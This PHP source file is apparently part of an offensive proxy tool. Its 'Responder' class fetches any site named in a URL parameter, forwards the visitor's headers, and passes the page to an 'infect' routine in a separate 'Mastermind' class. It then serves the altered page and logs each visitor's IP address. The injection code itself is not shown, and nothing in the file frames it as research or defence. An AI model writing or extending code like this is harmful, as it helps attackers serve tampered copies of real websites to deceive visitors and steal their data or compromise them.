<?php

require_once($_SERVER["DOCUMENT_ROOT"] . '/Classes/Crawler.php');
require_once($_SERVER["DOCUMENT_ROOT"] . '/Classes/Logger.php');
require_once($_SERVER["DOCUMENT_ROOT"] . '/Classes/Mastermind.php');


class Responder {

	function __construct() {
		$this->logger = Logger::getInstance();;
	}

	private function getHeaders() {
		$request_headers = array();
		foreach (apache_request_headers() as $key => $value) {
			if (strtolower($key) === 'host') { continue; }
			if (strtolower($key) === 'accept-encoding') {
				$value = str_replace(", br", "", $value);
			}
			array_push($request_headers, $key . ': ' . $value);
		}
		array_push($request_headers, "Accept-Language: en-US,en;q=0.5");
		return $request_headers;
	}

	private function validateRequest() {
		$isValid = TRUE;
		$isValid = isset($_GET['s']) && $isValid;
		return $isValid;
	}

	private function scrape() {
		$scraper = new Crawler($_GET['s'], $this->getHeaders());
		$html = $scraper->getHTML();
		$real_url = $scraper->getURL();
		return array($real_url, $html);
	}

	private function infect($html, $url) {
		$infector = new Mastermind($html, $url);
		$html = $infector->getHTML();
		return $html;
	}
	
	public function respond() {
		$this->logger->log('-------------------------------------------------------------');
		$this->logger->log("Starting a new session with ip: " . $_SERVER["REMOTE_ADDR"], 1);
		if (!$this->validateRequest()) {
			$this->logger->log("The url param wasn't set, QUITTING", 2);
			die();
		}

		try {
			$this->logger->log("Scrapping the website: " . $_GET['s']);
			$html = $this->scrape()[1];
			$real_url = $this->scrape()[0];
		} catch (Exception $e) {
			$this->logger->log("Failed scrapping site, QUITTING", 2);
		}

		try {
			$this->logger->log("Infecting the site");
			$html = $this->infect($html, $real_url);
		} catch (Exception $e) {
			$this->logger->log("Failed infecting site, QUITTING", 2);
		}
		$this->logger->log("Serving response!");
		return $html;
	}
}